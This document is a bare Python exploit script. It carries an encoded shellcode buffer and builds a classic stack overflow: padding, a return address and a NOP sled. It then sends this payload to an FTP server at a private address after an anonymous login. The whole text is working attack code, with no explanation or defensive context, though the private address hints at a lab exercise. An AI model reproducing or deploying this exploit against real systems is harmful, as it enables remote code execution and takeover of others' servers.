import socket, os, sys

buf =  b""
buf += b"\xbb\xab\x90\x95\xa0\xd9\xce\xd9\x74\x24\xf4\x58\x31"
buf += b"\xc9\xb1\x52\x83\xc0\x04\x31\x58\x0e\x03\xf3\x9e\x77"
buf += b"\x55\xff\x77\xf5\x96\xff\x87\x9a\x1f\x1a\xb6\x9a\x44"
buf += b"\x6f\xe9\x2a\x0e\x3d\x06\xc0\x42\xd5\x9d\xa4\x4a\xda"
buf += b"\x16\x02\xad\xd5\xa7\x3f\x8d\x74\x24\x42\xc2\x56\x15"
buf += b"\x8d\x17\x97\x52\xf0\xda\xc5\x0b\x7e\x48\xf9\x38\xca"
buf += b"\x51\x72\x72\xda\xd1\x67\xc3\xdd\xf0\x36\x5f\x84\xd2"
buf += b"\xb9\x8c\xbc\x5a\xa1\xd1\xf9\x15\x5a\x21\x75\xa4\x8a"
buf += b"\x7b\x76\x0b\xf3\xb3\x85\x55\x34\x73\x76\x20\x4c\x87"
buf += b"\x0b\x33\x8b\xf5\xd7\xb6\x0f\x5d\x93\x61\xeb\x5f\x70"
buf += b"\xf7\x78\x53\x3d\x73\x26\x70\xc0\x50\x5d\x8c\x49\x57"
buf += b"\xb1\x04\x09\x7c\x15\x4c\xc9\x1d\x0c\x28\xbc\x22\x4e"
buf += b"\x93\x61\x87\x05\x3e\x75\xba\x44\x57\xba\xf7\x76\xa7"
buf += b"\xd4\x80\x05\x95\x7b\x3b\x81\x95\xf4\xe5\x56\xd9\x2e"
buf += b"\x51\xc8\x24\xd1\xa2\xc1\xe2\x85\xf2\x79\xc2\xa5\x98"
buf += b"\x79\xeb\x73\x0e\x29\x43\x2c\xef\x99\x23\x9c\x87\xf3"
buf += b"\xab\xc3\xb8\xfc\x61\x6c\x52\x07\xe2\x53\x0b\x06\x99"
buf += b"\x3b\x4e\x08\x59\x6e\xc7\xee\x0b\x9e\x8e\xb9\xa3\x07"
buf += b"\x8b\x31\x55\xc7\x01\x3c\x55\x43\xa6\xc1\x18\xa4\xc3"
buf += b"\xd1\xcd\x44\x9e\x8b\x58\x5a\x34\xa3\x07\xc9\xd3\x33"
buf += b"\x41\xf2\x4b\x64\x06\xc4\x85\xe0\xba\x7f\x3c\x16\x47"
buf += b"\x19\x07\x92\x9c\xda\x86\x1b\x50\x66\xad\x0b\xac\x67"
buf += b"\xe9\x7f\x60\x3e\xa7\x29\xc6\xe8\x09\x83\x90\x47\xc0"
buf += b"\x43\x64\xa4\xd3\x15\x69\xe1\xa5\xf9\xd8\x5c\xf0\x06"
buf += b"\xd4\x08\xf4\x7f\x08\xa9\xfb\xaa\x88\xd9\xb1\xf6\xb9"
buf += b"\x71\x1c\x63\xf8\x1f\x9f\x5e\x3f\x26\x1c\x6a\xc0\xdd"
buf += b"\x3c\x1f\xc5\x9a\xfa\xcc\xb7\xb3\x6e\xf2\x64\xb3\xba"

buff = "A"*251 + '\x71\xe8\xf1\x77' + '\x90' * 20 + buf 

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(('192.168.1.108', 21))

s.recv(1024)

s.send('USER anonymous\r\n')

s.recv(1024)

s.send('PASS anonymous\r\n')

s.recv(1024)

s.send(buff + '\r\n')

s.send('QUIT\r\n')

s.close()
